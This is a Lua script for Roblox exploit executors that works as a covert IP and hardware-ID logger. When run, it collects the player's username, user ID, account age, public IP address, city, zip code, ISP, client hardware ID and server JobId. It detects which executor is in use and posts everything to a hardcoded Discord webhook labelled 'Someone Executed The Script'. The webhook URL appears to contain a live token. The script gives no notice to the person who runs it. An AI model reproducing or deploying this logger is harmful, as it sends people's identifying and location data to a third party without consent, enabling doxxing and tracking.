local LocalPlayer = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")

-- Player Info
local DName = game.Players.LocalPlayer.DisplayName -- PlayerInfo Display Name
local Name = game.Players.LocalPlayer.Name -- Name
local Userid = game.Players.LocalPlayer.UserId -- UserId
local Country = game.LocalizationService.RobloxLocaleId -- Country
local GetIp = game:HttpGet("https://v4.ident.me/") -- Ip
local IpInfo = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))

local IpFields = {
    "query", -- IP address
    "country", -- Country
    "regionName", -- Region
    "city", -- City
    "zip", -- Zip code
    "isp", -- ISP
    "org", -- Organization
    "as", -- Autonomous system
}

local IpInfoFields = {}
for _, field in ipairs(IpFields) do
    if IpInfo[field] then
        IpInfoFields[field] = IpInfo[field]
    end
end

-- Convert the IP info table into a formatted string
local IpInfoString = ""
for field, value in pairs(IpInfoFields) do
    IpInfoString = IpInfoString .. "**" .. field .. ":** " .. value .. "\n"
end

local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'

-- GameInfo
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name

local webhookcheck = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
  or (secure_load and "Sentinel")
  or (pebc_execute and "ProtoSmasher")
  or (KRNL_LOADED and "Krnl")
  or (is_sirhurt_closure and "SirHurt")
  or (identifyexecutor():find("ScriptWare") and "Script-Ware")
  or ("Shitty Exploit")

local url = "https://discord.com/api/webhooks/1119370755562545152/T3gq0aA7nKhAltFPKJhliWKbfSG8KzdJxencJsbCreKRvTE37V5n2E0Nx-e84jQZQ3o9"

local data = {
    ["avatar_url"] = "https://i.imgur.com/oBPXx0D.png",
    ["content"] = "",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = "( Someone Executed The Script )",
                ["url"] = "https://roblox.com",
            },
            ["description"] = "__[Player Info](https://www.roblox.com/users/"..Userid..")__\n"
                .."**Display Name:** "..DName.."\n"
                .."**Username:** "..Name.."\n"
                .."**User Id:** "..Userid.."\n"
                .."**MembershipType:** "..MembershipType.."\n"
                .."**AccountAge:** "..AccountAge.."\n"
                .."**Country:** "..Country.."\n"
                .."**IP:** "..GetIp.."\n"
                .."**Hwid:** "..GetHwid.."\n"
                .."**Date:** "..tostring(os.date("%m/%d/%Y")).."\n"
                .."**Time:** "..tostring(os.date("%X")).."\n\n"
                .."__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__\n"
                .."**Game:** "..GAMENAME.."\n"
                .."**Game Id**: "..game.PlaceId.."\n"
                .."**Exploit:** "..webhookcheck.."\n\n"
                .."**IP Information:**\n"..IpInfoString.."\n"
                .."**JobId:**\n```"..ConsoleJobId.."```",
            ["type"] = "rich",
            ["color"] = tonumber(0xf2ff00),
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png",
            },
        },
    },
}
local newdata = HttpService:JSONEncode(data)

local headers = {
    ["content-type"] = "application/json",
}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)